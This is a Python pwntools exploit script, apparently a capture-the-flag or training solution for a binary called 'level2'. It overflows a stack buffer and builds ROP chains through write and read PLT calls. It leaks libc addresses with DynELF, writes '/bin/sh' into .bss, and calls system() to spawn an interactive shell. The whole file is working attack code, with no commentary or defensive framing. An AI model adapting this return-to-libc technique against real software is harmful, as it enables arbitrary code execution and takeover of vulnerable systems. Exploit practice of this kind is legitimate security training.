from pwn import *

# context.log_level = 'debug'

p = process('./level2')
elf = ELF('./level2')

write_plt = elf.plt['write']
read_plt = elf.plt['read']
vulfun_addr = 0x08048404
bss_addr = 0x0804A018
pop3_ret = 0x080484bd
pad = 'A'*140

def leak(addr):
    payload1 = pad 
    payload1 += p32(write_plt) 
    payload1 += p32(vulfun_addr)
    payload1 += p32(1) + p32(addr) + p32(4)
    p.send(payload1)
    data = p.recv(4)
    return data

d = DynELF(leak, elf=ELF('./level2'))

system_addr = d.lookup('system', 'libc')
print "system_addr=" + hex(system_addr)

payload2 = pad 
payload2 += p32(read_plt) 
payload2 += p32(pop3_ret) 
payload2 += p32(0)+p32(bss_addr)+p32(8) 
payload2 += p32(system_addr)+p32(vulfun_addr)+p32(bss_addr)

p.send(payload2)
p.send("/bin/sh\x00")
p.interactive()